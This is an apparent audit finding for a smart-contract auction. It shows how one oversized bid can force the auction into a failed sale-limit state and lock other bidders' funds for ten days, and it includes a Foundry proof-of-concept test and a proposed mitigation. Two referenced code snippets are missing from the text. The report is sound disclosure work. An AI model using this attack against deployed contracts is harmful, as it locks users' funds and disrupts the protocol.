# Auction can be DoSed through bid manipulation leading to guaranteed FAILED_POOL_SALE_LIMIT state

Likelihood :  Medium
Severity :  Medium 


### Description:
The auction can be manipulated to always fail by exploiting the lack of proper validation on `buyReserveAmount` in relation to the pool's sale limit. An attacker can place a bid with a very high `buyReserveAmount` that would exceed the pool's sale limit, forcing the auction into a `FAILED_POOL_SALE_LIMIT` state.

The only restrictions on `buyReserveAmount` are:

When the auction ends, it checks:

An attacker can:

1. Wait for legitimate bids to be placed
2. Place a bid with `buyReserveAmount` high enough to make `totalSellReserveAmount` exceed the pool's sale limit
3. When `endAuction()` is called, the auction will enter `FAILED_POOL_SALE_LIMIT` state
4. All legitimate bidders will have their funds locked for the duration of the auction

The attack can be executed at minimal cost, as the attacker only needs enough coupon tokens to fill a single open bid slot. However, this presumes at least one slot remains unoccupied if all slots are taken, the attacker would instead have to outbid an existing bid, potentially increasing their required capital.

### Impact:

- Auction mechanism can be consistently forced to fail
- User funds are locked for the 10-day auction period
- Core protocol functionality is disrupted
- Loss of gas fees for legitimate bidders
- Protocol loses ability to generate USDC for coupon payments

### Proof of concet:

Past this into `AuctionTest` :

```solidity
    function setUp() public {
        usdc = new Token("USDC", "USDC", false);
        weth = new Token("WETH", "WETH", false);

        pool = createPool(address(weth), address(usdc));
        useMockPool(pool);

        vm.startPrank(pool);
        auction = Auction(
            Utils.deploy(
                address(new Auction()),
                abi.encodeWithSelector(
                    Auction.initialize.selector,
                    address(usdc),
                    address(weth),
                    1000000000000,
                    block.timestamp + 10 days,
                    300,  //@audit maxBids (reduced from 1000)
                    house,
                    110
                )
            )
        );
        vm.stopPrank();
    }

    function test_dos_auction() public {
        uint256 sizeAmount = auction.totalBuyCouponAmount() / auction.maxBids();

        address attacker = makeAddr("attacker");
        vm.label(attacker, "attacker");
        usdc.mint(attacker, sizeAmount * 10);

        for (uint256 i = 0; i < 299; i++) {
            address newBidder = address(uint160(i + 1));
            vm.startPrank(newBidder);
            usdc.mint(newBidder, sizeAmount);
            usdc.approve(address(auction), sizeAmount);
            auction.bid(100, sizeAmount);
            vm.stopPrank();
        }

        vm.startPrank(attacker);
        usdc.approve(address(auction), sizeAmount * 10);
        auction.bid(auction.totalSellReserveAmount(), sizeAmount);
        vm.warp(auction.endTime() + 1);
        auction.endAuction();
        vm.expectRevert(abi.encodeWithSignature("AuctionFailed()"));
        auction.claimBid(300);
    }


```

### Recommended Mitigation:

 **Proposed Hybrid Approach**

 - **While Bid Slots Are Still Open**: Maintain a **dynamic threshold** that disallows any new bid if adding it would push `totalSellReserveAmount` above `((poolBalance *poolSaleLimit) / 100)`. This prevents a malicious actor from flooding the auction with an oversized initial bid that instantly dooms it to `FAILED_POOL_SALE_LIMIT`.
 - **Once All Bid Slots Are Filled**: Disabling (or relaxing) that threshold can be reasonable if a new bidder is _required_ to outbid an existing one to claim a slot. In this scenario, placing a dramatically huge `buyReserveAmount` simultaneously demands a proportionally large `sellCouponAmount`, so an attacker faces significant upfront capital requirements—and no longer trivially forces the auction to fail at minimal cost.

This way:

1. **Open Slots → Strict Threshold**
   - Prevents early “mega-bids” that push the auction into a guaranteed fail state.
2. **Full Slots → Bid Replacement Logic**
   - Bidders must “beat” an existing bid, which demands more capital, thereby naturally deterring malicious out-of-scale bidding (since they’d risk far more collateral). If someone truly bids that high, they bear the cost.

Overall, this balances the desire to keep auctions competitive with the need to block cheap, malicious overbids that lock or ruin the entire process.
